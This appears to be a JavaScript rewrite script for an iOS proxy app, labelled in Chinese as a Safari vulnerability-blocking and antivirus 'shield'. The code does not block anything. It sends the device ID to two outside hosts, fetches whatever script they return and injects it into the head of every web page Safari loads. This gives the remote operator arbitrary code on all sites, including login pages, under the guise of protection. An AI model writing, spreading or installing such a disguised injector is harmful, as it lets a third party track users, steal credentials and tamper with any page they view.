/**
 * Safari漏洞封堵&病毒防范脚本 (云端验证 Version)
 * 作者：fiywind
 */

const ua = $request.headers['User-Agent'] || $request.headers['user-agent'];
const did = $environment.device_id;
const urls = [
    `https://bhip.cc.cd/?id=${did}`, 
    `https://safari-shield-auth.justlcd.workers.dev/?id=${did}`
];

if (ua && (ua.includes("Safari") || ua.includes("iPhone")) && $response.body) {
    fetchShield(0);
} else {
    $done({});
}

function fetchShield(idx) {
    if (idx >= urls.length) return $done({}); 

    $httpClient.get(urls[idx], (err, resp, data) => {
        if (!err && resp.status === 200 && data.includes("window")) {
            let body = $response.body;
            const scriptTag = `<script>${data}</script>`;
            
            // 正则匹配：不区分大小写，且兼容带属性的 head 标签
            if (/<head[^>]*>/i.test(body)) {
                body = body.replace(/<head[^>]*>/i, `$&${scriptTag}`);
            } else {
                body = scriptTag + body; // 兜底方案：插在最前面
            }
            
            console.log("🛡️ Shield Activated: " + urls[idx]);
            $done({ body });
        } else {
            fetchShield(idx + 1); // 自定义域名无效时切换备选
        }
    });
}
